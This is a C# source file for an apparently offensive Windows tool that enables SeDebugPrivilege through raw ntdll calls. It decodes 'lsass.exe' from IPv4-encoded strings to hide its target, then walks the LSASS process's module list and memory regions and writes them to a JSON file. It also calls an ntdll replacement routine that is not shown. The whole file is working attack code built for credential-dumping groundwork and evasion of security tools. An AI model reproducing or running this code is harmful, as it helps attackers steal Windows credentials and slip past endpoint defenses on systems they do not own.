using System;
using System.Linq;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static Shock.NT;
using System.Text;


namespace Shock
{
    internal class Program
    {
        // Constants
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint MemoryBasicInformation = 0;
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;

        // Functions
        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")] public static extern bool NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);

        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("ntdll.dll")] public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        // Structures
        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION { public IntPtr BaseAddress; public IntPtr AllocationBase; public int AllocationProtect; public IntPtr RegionSize; public int State; public int Protect; public int Type; }

        // Custom class
        public class ModuleInformation
        {
            public string Name;
            public string FullPath;
            public IntPtr Address;
            public int Size;
            public ModuleInformation(string name, string fullpath, IntPtr address, int size)
            {
                this.Name = name;
                this.FullPath = fullpath;
                this.Address = address;
                this.Size = size;
            }
        }

        
        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
        {
            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();

            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_fulldllname_offset = 0x40;
            int flink_buffer_offset = 0x50;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
                // DLL base name
                string base_dll_name = "";
                if (buffer != IntPtr.Zero) {
                    base_dll_name = ReadRemoteWStr(hProcess, buffer);
                }
                // DLL full path
                string full_dll_path = ReadRemoteWStr(hProcess, ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_fulldllname_offset)));

                moduleInformationList.Add(new ModuleInformation(base_dll_name.ToLower(), full_dll_path, dll_base, 0));
                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
            }
            return moduleInformationList;
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] File " + path + " generated.");
        }


        public static IntPtr GetProcessByName(string proc_name)
        {
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            
            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                string current_proc_name = GetProcNameFromHandle(aux_handle);
                if (current_proc_name == proc_name) {
                    return aux_handle;
                }
            }
            return IntPtr.Zero;
        }


        unsafe static string GetProcNameFromHandle(IntPtr process_handle) {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int commandline_offset = 0x68;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get PEB->ProcessParameters
            int processparameters_offset = 0x20;
            IntPtr processparameters_pointer = pebaddress + processparameters_offset;
            
            // Get ProcessParameters->CommandLine
            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);

            /* Console.WriteLine("pebaddress: \t\t0x" + pebaddress.ToString("X"));
            Console.WriteLine("processparameters_pointer: \t\t0x" + processparameters_pointer.ToString("X"));
            Console.WriteLine("processparameters_adress : \t\t0x" + processparameters_adress.ToString("X"));
            Console.WriteLine("commandline_pointer:\t\t0x" + commandline_pointer.ToString("X"));
            Console.WriteLine("commandline_address:\t\t0x" + commandline_address.ToString("X")); */

            return commandline_value;
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        static byte[] getBytesFromIPv4(string ipv4_str)
        {
            int ipv4_size = 4;
            byte[] ipv4_bytes = new byte[ipv4_size];
            List<int> Ipv4Vals = ipv4_str.Split('.').Select(int.Parse).ToList();
            for (int i = 0; i < ipv4_size; i++)
            {
                ipv4_bytes[i] = (byte)(Ipv4Vals[i]);
            }
            return ipv4_bytes;
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        public static byte[] ToByteArray(String hexString)
        {
            // In case the string length is odd
            if (hexString.Length % 2 == 1)
            {
                Console.WriteLine("[-] Hexadecimal value length is odd, adding a 0.");
                hexString += "0";
            }
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        // Source: https://github.com/ricardojoserf/SharpObfuscate
        static string decodeIPv4(List<String> ipv4_str_list)
        {
            int ipv4_size = 4;
            string total_bytes_str = "";
            foreach (string ipv4_str in ipv4_str_list)
            {
                byte[] ipv4_bytes = getBytesFromIPv4(ipv4_str);
                for (int i = 0; i < ipv4_size; i++)
                {
                    total_bytes_str += ipv4_bytes[i].ToString("X2");
                }
            }
            return Encoding.UTF8.GetString(ToByteArray(total_bytes_str)).TrimEnd('\0');
        }


        static void Shock(string file_name) {
            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Decode process name (C:\\WINDOWS\\system32\\lsass.exe)
            List<string> process_name_ipv4_encoded = new List<string> { "67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0" };
            string proc_name = decodeIPv4(process_name_ipv4_encoded);

            // Get process handle
            IntPtr processHandle = GetProcessByName(proc_name);
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // List to get modules information
            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = IntPtr.Zero;
            int aux_size = 0;
            string aux_name = "";

            while ((long)mem_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                uint ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)mem_address, MemoryBasicInformation, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    ModuleInformation aux_module = moduleInformationList.Find(obj => obj.Name == aux_name);

                    if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.Address)
                    {
                        aux_module.Size = aux_size;
                        int aux_index = moduleInformationList.FindIndex(obj => obj.Name == aux_name);
                        moduleInformationList[aux_index] = aux_module;

                        foreach (ModuleInformation modInfo in moduleInformationList)
                        {
                            if (mbi.BaseAddress == modInfo.Address)
                            {
                                aux_name = modInfo.Name.ToLower();
                                aux_size = (int)mbi.RegionSize;
                            }
                        }
                    }
                    else
                    {
                        aux_size += (int)mbi.RegionSize;
                    }
                }
                // Next memory region
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }
            // Close process handle
            NtClose(processHandle);

            // Generate JSON
            string[] aux_array_1 = { };
            foreach (ModuleInformation modInfo in moduleInformationList)
            {
                string[] aux_array_2 = { modInfo.Name.ToString(), modInfo.FullPath.ToString().Replace("\\", "\\\\"), ("0x" + modInfo.Address.ToString("X")), modInfo.Size.ToString() };
                aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();

            }
            string shock_json_content = ToJsonArray(aux_array_1);
            WriteToFile(file_name, shock_json_content);
        }


        static void Main(string[] args)
        {
            // Replace ntdll library
            string option = "default";
            string wildcard_option = "";
            if (args.Length >= 1)
            {
                option = args[0];
            }
            if (args.Length >= 2)
            {
                wildcard_option = args[1];
            }
            ReplaceLibrary(option, wildcard_option);

            // Get modules (ModuleList) information. Argument: Name of JSON file
            Shock("shock.json");
        }
    }
}